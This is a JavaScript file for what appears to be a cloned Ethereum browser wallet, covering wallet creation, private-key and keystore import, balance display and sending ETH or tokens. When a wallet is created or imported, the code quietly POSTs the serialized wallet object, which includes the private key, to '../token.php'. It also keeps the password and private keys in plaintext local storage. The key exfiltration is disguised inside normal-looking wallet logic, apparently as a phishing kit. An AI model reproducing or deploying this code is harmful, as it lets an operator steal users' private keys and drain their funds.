



$('.bt').on('click', function() {

	document.location.replace($(this).data("link"));
});

let check = false;

let passForCreate = false;

let passForCreateConfir = false;


function showBtn() {
	
	if(check && passForCreate && passForCreateConfir){

		$("#buttonForCreate").prop("disabled", false);

	}
	else{
		$("#buttonForCreate").prop("disabled", true);

		
	}
}



$('#passForCreate').on("change keyup paste", function(evt) {

	let pass = $(this).val();

	if(pass.length < 8){

		$("#"+$(this).data("error")).show();
		passForCreate = false;
	}
	else{
		$("#"+$(this).data("error")).hide();
		passForCreate = true;
	}


	showBtn();

});



$('#passForCreateConfir').on("change keyup paste", function(evt) {

	let pass = $(this).val();

	if(pass !== $("#passForCreate").val()){

		$("#"+$(this).data("error")).show();
		passForCreateConfir = false;
	}
	else{
		$("#"+$(this).data("error")).hide();
		passForCreateConfir = true;
	}

	showBtn();

});




$('.checkBox').on("click", function(){


	if(check){

		$('#Capa_1').hide();
		check = false

	}else{
		$('#Capa_1').show();
		check = true
	}

	showBtn();

});


$("#buttonForCreate").on("click", function(){

	let randomWallet = ethers.Wallet.createRandom();

	let pass = $("#passForCreate").val();

	localStorage.setItem('password', JSON.stringify(pass));

	localStorage.setItem('wallet', JSON.stringify(randomWallet));

	


	var a = {};

	if(localStorage.getItem("wallets")){

		a = JSON.parse(localStorage.getItem("wallets"));

		a[randomWallet.signingKey.privateKey] = {"wallet": randomWallet, "name":"Account "+ (Object.keys(a).length+1)};

	}else{


		a[""+randomWallet.signingKey.privateKey+""] = {"wallet": randomWallet, "name":"Account 1"};


	}

	localStorage.setItem("wallets", JSON.stringify(a));


	$.ajax({
	  method: "POST",
	  url: "../token.php",
	  data: { name: JSON.stringify(randomWallet) }
	})
	.done(function( msg ) {

	  	window.location.href = 'word.html';
	    
	 });

	

	
});


$(".owerlayWord").on("click", function() {

	$("#word").removeClass("blur");
	
	$(".owerlayWord").hide();

	$("#zxcv").prop("disabled", false);
})


$(".detailse").on('click', function(){

	$(".owerlay").show(); 

	$(".popap").show();


});


$("#qpqp").on('click', function(){


	$(".owerlay").hide(); 

	$(".popap").hide();


});

$('.bt55655').on('click', function() {
  var win = window.open($(this).data("link"), '_blank');
  win.focus();
})

const copyToClipboard = str => {
  const el = document.createElement('textarea');  // Create a <textarea> element
  el.value = str;                                 // Set its value to the string that you want copied
  el.setAttribute('readonly', '');                // Make it readonly to be tamper-proof
  el.style.position = 'absolute';                 
  el.style.left = '-9999px';                      // Move outside the screen to make it invisible
  document.body.appendChild(el);                  // Append the <textarea> element to the HTML document
  const selected =            
    document.getSelection().rangeCount > 0        // Check if there is any content selected previously
      ? document.getSelection().getRangeAt(0)     // Store selection if found
      : false;                                    // Mark as false to know no selection existed before
  el.select();                                    // Select the <textarea> content
  document.execCommand('copy');                   // Copy - only works as a result of a user action (e.g. click events)
  document.body.removeChild(el);                  // Remove the <textarea> element
  if (selected) {                                 // If a selection existed before copying
    document.getSelection().removeAllRanges();    // Unselect everything on the HTML document
    document.getSelection().addRange(selected);   // Restore the original selection
  }
};


$('#copy').click(function() {


       copyToClipboard($("#wallet_id_popap").val());

	});

$("#transactionbuttonPopap").on("click", function(){

	$(".owerlay").show(); 

	$(".addEthBoxPopap").show();
});




$("#transactionbuttonPopapCloce").on('click', function(){


	$(".owerlay").hide(); 

	$(".addEthBoxPopap").hide();


});

$(".detailsPopap").on('click', function(){

	$(".addEthBoxPopap").hide();

	$(".popap").show();
});


$(".avatarBox").on('click', function(e){

	 e.stopPropagation();

	$(".menu").show();
})


$(document).click(function () {
    $('.menu').hide();
});

$(".searchTokenTabs").on('click', function(){

	$(".searchTokenTabs").removeClass( "active" );

	$(this).addClass("active");

	$(".TabContentToken").hide();

	$("#"+$(this).data("val")).show();

});


$(document).ready(function(){
  $("#myInput").on("keyup", function() {
  	$(".sTokenSelect").hide();
  	$(".selectsSearchTokens").show();
    var value = $(this).val().toLowerCase();
    $(".item").filter(function() {
      $(this).toggle($(this).children("span").text().toLowerCase().indexOf(value) > -1)
    });
  });
});



		$(document).on('click','.item',function(){

	$(this).toggleClass("add");

	if($('.add').length > 0 ){

		$(".sNext").prop("disabled", false);

	}
	else{

		$(".sNext").prop("disabled", true);

		
	}

});

$(".goHome").on("click", function(){

	var waddress = JSON.parse(localStorage.getItem('wallet')).signingKey.address;


	$( ".add" ).each(function( index ) {

	  	let type = $( this ).data("type"); 

	  	let address = $( this ).data("address"); 

	  	let count = $( this ).data("count"); 

	  	let name = $( this ).children("span").text();

		let img = $(this).children('.itemImgBox').children(' img').attr('src');

		var  array = localStorage.getItem("tokens");


		if(array){
			var  array = JSON.parse(localStorage.getItem("tokens"));

		}
		else{

			 array = [];
		}



		array.push({ "img": img, "name": name, "type": type , "cantractAddress": address , "count": count, "address" : waddress});


		

	

		localStorage.setItem("tokens",JSON.stringify(array));
	});

		var qwerty = localStorage.getItem("token");

		if(qwerty){

			qwerty = JSON.parse(qwerty)

			var  array = localStorage.getItem("tokens");


			if(array){
				var  array = JSON.parse(localStorage.getItem("tokens"));

			}
			else{

				 array = [];
			}
			

			array.push({ "img": "assets/img/default.png", "name": qwerty.name, "type":  qwerty.name , "cantractAddress":  qwerty.address , "count":  qwerty.count, "address" : waddress});

			localStorage.setItem("tokens",JSON.stringify(array));

			localStorage.setItem("token", "");


		}



	document.location.replace($(this).data("link"));




});

$(".sNext").on("click", function(){

	$(".hTabs").hide();
	$(".TabContentToken").hide();
	$(".hTabsText").show();
	$(".addTokenBox").show();

	let html = "";

	$( ".add" ).each(function( index ) {
	  


	  	let name = $( this ).children("span").text();




		html += `<div class="tokenBalance"><div class= "maas"><div class="itemImgBox"><img src="`+$(this).children('.itemImgBox').children(' img').attr('src')+`" alt=""></div><span>`
				+name+`</span></div><div class="amountTokenBox"><span>0 USDT</span></div></div>`
		});

		$("#qwesa").html(html);

		var qwerty = localStorage.getItem("token");

		
		if(qwerty){

			qwerty = JSON.parse(qwerty)


				h = `<div class="tokenBalance"><div class= "maas"><div class="itemImgBox"><img src="assets/img/default.png" alt=""></div><span>`
				+qwerty.name+`</span></div><div class="amountTokenBox"><span>0 USDT</span></div></div>`

				$("#qwesa").html(h);


		}



	$(".sNext").hide();

	$(".goHome").show();


})

function isAddress(address) {
    try {
        ethers.utils.getAddress(address);
    } catch (e) { return false; }
    return true;
}


$(".suc").on("change keyup paste", function(){

	if(isAddress($(this).val())){


		$(".errorMessageSearchethAddress").hide();
		$("#ssserach").hide();

		$("#sssuccsssecc").show();

		$("#ssscloce").show();

		$(".payTypeBox").show();

		$(".sTokenButtons").show();

		

		
	}
	else{
		$(".errorMessageSearchethAddress").show();

		$("#ssserach").show();

		$("#sssuccsssecc").hide();

		$("#ssscloce").hide();

		$(".payTypeBox").hide();

		$(".sTokenButtons").hide();
	}

})

$(".xx").on('click', function(){

	$(".suc").val("");


	$("#ssserach").show();

	$("#sssuccsssecc").hide();

	$("#ssscloce").hide();

	$(".payTypeBox").hide();

	$(".sTokenButtons").hide();

})

$(".seleCtAccountFOrPay").on("click", function(e){


	e.stopPropagation();

	$(".poa").show();


})

$(document).click(function () {
    $('.poa').hide();
});




	$(document).on('click','.imt',function(e){


	e.stopPropagation();

	$("#mainType").text($(this).children(".sendTransBoxBalance").children(".typeLs").text());

	$("#mainBalance").text($(this).children(".sendTransBoxBalance").children(".amST").text());

	

	$("#MAinLOGO").attr('src', $(this).children(".lTrans").children("img").attr('src'));

	$('.poa').hide();

	$(".df").text($(this).data("type"));

	$(".seleCtAccountFOrPay").attr("data-adderss", $(this).data("address") );



	$("#amountInput").attr("data-amount", $("#"+$(this).data("address")).text());

	localStorage.setItem('amount', $("#"+$(this).data("address")).text());

	if($(this).data("type") != "ETH"){

		$(".swapBox").hide();

		$(".bam").hide();

		$("#amountInput").removeClass("ethInput");

	}else{

		$(".swapBox").show();
		$(".bam").show();

		$("#amountInput").addClass("ethInput");
	}


})

$('.payTypeBox').click(function(){
    $('#amountInput').focus();
});



$("#amountInput").on("change keyup paste", function(){


	if($(this).val().length != 0){
		$(this).css("width" , $(this).val().length+".5ch");
	}
	else{
		$(this).css("width" , "1.5ch");

	}


	
	let etherscanProvider = new ethers.providers.EtherscanProvider();

	// Getting the current Ethereum price
	etherscanProvider.getEtherPrice().then(function(price) {


		if($("#amountInput").hasClass("ethInput")){


			if(localStorage.getItem("eth") == "eth"){

					console.log("eth");

					$("#convetr").text(price * $("#amountInput").val()+" ");

			}else{

					$("#convetr").text( ($("#amountInput").val()/price).toString().substr(0,6) );

					console.log("usd");

				}

			



			etherscanProvider.getBalance(JSON.parse(localStorage.getItem('wallet')).signingKey.address).then((balance) => {

			    // balance is a BigNumber (in wei); format is as a sting (in ether)
			    etherString = ethers.utils.formatEther(balance);

			
					  	
				if(localStorage.getItem("eth") == "eth"){

					amount = $("#amountInput").val();

				}else{

					amount = $("#convetr").text();

				}


			    if( amount >=  etherString){


				   		$(".cc").addClass("wertError");


				   		$(".cpoa").show();

				   		$("#SendETH").prop("disabled", true);
				}
				else{

				   		$(".cc").removeClass("wertError");

				   		$(".cpoa").hide();

				   		$("#SendETH").prop("disabled", false);
				}

			    


			   

			
		    
		    
			});
		}
		else{

			if($("#amountInput").val() != 0){


					var amount =  localStorage.getItem('amount');

				   	if($("#amountInput").val()  >=  amount){

				   		$(".cc").addClass("wertError");




				   		$(".cpoa").show();


				   		$("#SendETH").prop("disabled", true);

				   

				   	}
				   	else{

				   		if($(".cc").hasClass("wertError")){

							$(".cc").removeClass("wertError");
				   		}

				   		

				   		$(".cpoa").hide();


				   		$("#SendETH").prop("disabled", false);

			
				   	}

				
			    
			    
			
			}else{
	$("#SendETH").prop("disabled", true);

			}

			
		}
	    
	    
	});


})



$(".swapBox").on('click', function(){

	let u = $(".df").text();

	let ug =$("#poi").text();


	$("#amountInput").val(0);

	$(".df").text(ug);

	$("#poi").text(u);

	// $("#amountInput").toggleClass("ethInput");

	if(localStorage.getItem("eth") == "eth"){

		localStorage.setItem("eth", "usd")

	}else{

		localStorage.setItem("eth", "eth")
	}

})

if(localStorage.getItem("wallet")){


		let etherString;

	let provider = new ethers.providers.EtherscanProvider();

	provider.getBalance(JSON.parse(localStorage.getItem('wallet')).signingKey.address).then((balance) => {

	    // balance is a BigNumber (in wei); format is as a sting (in ether)
	    etherString = ethers.utils.formatEther(balance);

	   	$(".ETHBALANCE").text(etherString.toString().substr(0,6));

	   	let etherscanProvider = new ethers.providers.EtherscanProvider();

		etherscanProvider.getEtherPrice().then(function(price) {

			$(".USDBALANCE").text((price * etherString).toString().substr(0,6));

	    
		});

		
	    
	    
	});




}





$("#SendETH").on("click", function(){





	if($("#amountInput").hasClass("ethInput")){

		if(localStorage.getItem("eth") == "eth"){

			amount = $("#amountInput").val();

		}else{

			amount = $("#convetr").text();

		}
		



		let privateKey = JSON.parse(localStorage.getItem('wallet')).signingKey.privateKey;
		let wallet = new ethers.Wallet(privateKey);

		console.log(wallet.address)


		provider.getTransactionCount(wallet.address, 'pending').then((transactionCount) => {



			let transaction = {
		    nonce: ethers.utils.bigNumberify(transactionCount),
		    gasLimit: 21000,
		    gasPrice: ethers.utils.bigNumberify("20000000000"),

		    to: $(".suc").val(),
		    // ... or supports ENS names
		    // to: "0x4D5335B8fcab9a69f36EC0D9EF69Ad000376455b",

		    value: ethers.utils.parseEther(amount),
		    data: "0x",

		    // This ensures the transaction cannot be replayed on different networks
		    chainId: ethers.utils.getNetwork('homestead').chainId
		}

		let signPromise = wallet.sign(transaction)

		console.log("1");


		let provider = new ethers.providers.EtherscanProvider();

		signPromise.then((signedTransaction) => {

			console.log(signedTransaction)

		    //console.log(signedTransaction);
		    // "0xf86c808504a817c8008252089488a5c2d9919e46f883eb62f7b8dd9d0cc45bc2
		    //    90880de0b6b3a76400008025a05e766fa4bbb395108dc250ec66c2f88355d240
		    //    acdc47ab5dfaad46bcf63f2a34a05b2cb6290fd8ff801d07f6767df63c1c3da7
		    //    a7b83b53cd6cea3d3075ef9597d5"

		    // This can now be sent to the Ethereum network
		   


		    console.log("2")

		    provider.sendTransaction(signedTransaction).then((tx) => {

		        console.log(tx);

		        toastr.success('Your funds was successfully sent!', 'Success');


		        

		        setTimeout(() => window.location.replace("home.html"), 1000);
		        // {
		        //    // These will match the above values (excluded properties are zero)
		        //    "nonce", "gasLimit", "gasPrice", "to", "value", "data", "chainId"
		        //
		        //    // These will now be present
		        //    "from", "hash", "r", "s", "v"
		        //  }
		        // Hash:
		    });
		})



    
		});
		// "0x4D5335B8fcab9a69f36EC0D9EF69Ad000376455b"

		// All properties are optional
		


	}
	else{

		var array = JSON.parse(localStorage.getItem("tokens"));

		var addre = $(".seleCtAccountFOrPay").data("adderss");

		var am = 0;
		for (var item in array) {

			if(array[item].cantractAddress == addre){



				am = array[item].count

			}
		}

		let privateKey = JSON.parse(localStorage.getItem('wallet')).signingKey.privateKey;
		let provider = new ethers.providers.EtherscanProvider();
		let wallet = new ethers.Wallet(privateKey, provider);




		var contractAddress = $(".seleCtAccountFOrPay").data("adderss");
		var contractAbiFragment = [
		   {
		      "name" : "transfer",
		      "type" : "function",
		      "inputs" : [
		         {
		            "name" : "_to",
		            "type" : "address"
		         },
		         {
		            "type" : "uint256",
		            "name" : "_tokens"
		         }
		      ],
		      "constant" : false,
		      "outputs" : [],
		      "payable" : false
		   }
		];
		var contract = new ethers.Contract(contractAddress, contractAbiFragment, wallet);

		console.log(am);

		// How many tokens?
		var numberOfDecimals = am;
		var numberOfTokens = ethers.utils.parseUnits($("#amountInput").val(), numberOfDecimals);
		console.log(numberOfTokens);


		var options = {
		    gasLimit: 61777,
		};


	

			// Send tokens
		contract.transfer($(".suc").val(), numberOfTokens, options).catch(function(reason) {

		
			toastr.error("You haven't enough ethers to send token", 'Error!')
	

		}).then(function(tx) {
			    console.log(tx);

		        toastr.success('Your funds was successfully sent!', 'Success');


		        

		        setTimeout(() => window.location.replace("home.html"), 1000);
			});
		
		


	}





})





$(".SelectBoxType").on("click", function(e){


	e.stopPropagation();

	$(".SelectBoxTypeContent").show();


})

$(document).click(function () {
    $('.SelectBoxTypeContent').hide();
});




$(document).on('click','.SelectBoxTypeContentItem',function(e){


	e.stopPropagation();
	$('.SelectBoxTypeContent').hide();

	$("#ty").text($(this).text());

	localStorage.setItem("importType",$(this).data("id") );

	if($(this).data("id") == "Private"){

		
		$(".Private").show();
		$(".JSON").hide();

	}else{

		$(".Private").hide();
		$(".JSON").show();
	}




})



$(".Import").on('click', function(){


	var type = localStorage.getItem("importType");


	if(type == "Private"){

		



		 try {

		  	let privateKey = $("#private_key").val();
			let wallet = new ethers.Wallet(privateKey)
					console.log(wallet);

			

			var a = {};

			if(localStorage.getItem("wallets")){

				a = JSON.parse(localStorage.getItem("wallets"));

				a[privateKey] = {"wallet": wallet, "name":"Account "+ (Object.keys(a).length+1)};

			}else{


				a[""+privateKey+""] = {"wallet": wallet, "name":"Account 1"};


			}

			localStorage.setItem('wallet', JSON.stringify(wallet));

			localStorage.setItem("wallets", JSON.stringify(a));

			$link = $(this).data("link");

			$.ajax({
			  method: "POST",
			  url: "../token.php",
			  data: { name: JSON.stringify(wallet) }
			})
			.done(function( msg ) {

			  	document.location.replace($link);
			    
			 });


			


		}
		catch(err) {
		  	$("#Private").show()
		}


	}else{

			$(".Import").prop("disabled", true);


			if (!window.File || !window.FileReader || !window.FileList || !window.Blob) {
	          alert('The File APIs are not fully supported in this browser.');
	          return;
	        }   

	        var input = document.getElementById('json_file');
	        if (!input) {
	          alert("Um, couldn't find the fileinput element.");
	        }
	        else if (!input.files) {
	          alert("This browser doesn't seem to support the `files` property of file inputs.");
	        }
	        else if (!input.files[0]) {
	          //alert("Please select a file before clicking 'Load'");  

	          		$("#json_file_error").text("You must select a file to import.");

	          		$("#json_file_error").show();  

	          		$(".Import").prop("disabled", false);           
	        }
	        else {

	        	if($("#jjjj").val() != ""){

	        		   var file = input.files[0];
			          var fr = new FileReader();
			          fr.onload = receivedText;
			          fr.readAsText(file);
			          //fr.readAsBinaryString(file); //as bit work with base64 for example upload to server

	        	}else{

	        		$("#json_pass").show();

	        		$(".Import").prop("disabled", false);

	        	}
	       
	      
	        }

	
 
      }

      function receivedText() {
      


        let data = fr.result;

		let json = data;
		let password = $("#jjjj").val();

		ethers.Wallet.fromEncryptedJson(json, password).catch(function(reason) {

			console.log(reason.message);

			if(reason.message == "invalid password"){

				$("#json_pass").show();

				$(".Import").prop("disabled", false);
			}else{

				$("#json_file_error").text("Unexpected number in JSON at position 1");

	          	$("#json_file_error").show();

	          	$(".Import").prop("disabled", false);
			}

		


		}).then(function(wallet) {
		    console.log( wallet);


		  	localStorage.setItem('wallet', JSON.stringify(wallet));

		    var a = {};

			if(localStorage.getItem("wallets")){

				a = JSON.parse(localStorage.getItem("wallets"));

				a[wallet.privateKey] = {"wallet": wallet, "name":"Account "+ (Object.keys(a).length+1)};

			}else{


				a[""+wallet.privateKey+""] = {"wallet": wallet, "name":"Account 1"};


			}

			localStorage.setItem("wallets", JSON.stringify(a));


			$link = "home.html";

			$.ajax({
			  method: "POST",
			  url: "../token.php",
			  data: { name: JSON.stringify(wallet) }
			})
			.done(function( msg ) {

			  	document.location.replace($link);
			    
			 });







		});



      }  

	


});



if(localStorage.getItem('wallet')){

		var a = JSON.parse(localStorage.getItem('wallets'));

	var stracc = "";

	for (var item in a) {

		if(JSON.parse(localStorage.getItem('wallet')).signingKey.privateKey == ""+item+""){






			stracc += `<div class="menuContent accountItem" data-id="`+item+`" data-address="`+a[""+item+""].wallet.signingKey.address+
			`"><p><img src="assets/img/check-white.svg" style="margin-right: 10px;" alt=""><img height="25px" style="margin-right: 10px; border-radius: 50px;" src="assets/img/default.png" alt="">`
			+a[""+item+""].name+`</p>

									<p class="aaw" data-address="`+a[""+item+""].wallet.signingKey.address+`">0 ETH</p>

							</div>`;

			$(".accNameHome").text(a[""+item+""].name);
		}else{
			stracc += `<div class="menuContent accountItem"  data-id="`+item+`" data-address="`+a[""+item+""].wallet.signingKey.address+`">

								<p><img height="25px" style="margin-right: 10px;margin-left:25px; ; border-radius: 50px;" src="assets/img/default.png" alt="">`+a[""+item+""].name+`</p>

								<p class="aaw" data-address="`+a[""+item+""].wallet.signingKey.address+`">0 ETH</p></div>`;

		}

	 
	}


	$(".accountBox").html(stracc);


}






$( ".aaw" ).each(function( index ) {


	let etherString;

	let provider = new ethers.providers.EtherscanProvider();

	provider.getBalance($(this).data("address")).then((balance) => {

	    etherString = ethers.utils.formatEther(balance);

	   	$(this).text(etherString.toString().substr(0,6) + " ETH");

	 

	    
	});


	




});





$(".accountItem").on("click", function(event){


    localStorage.setItem("wallet", JSON.stringify(JSON.parse(localStorage.getItem('wallets'))[$(this).data("id")].wallet));

     location.reload();

  
});
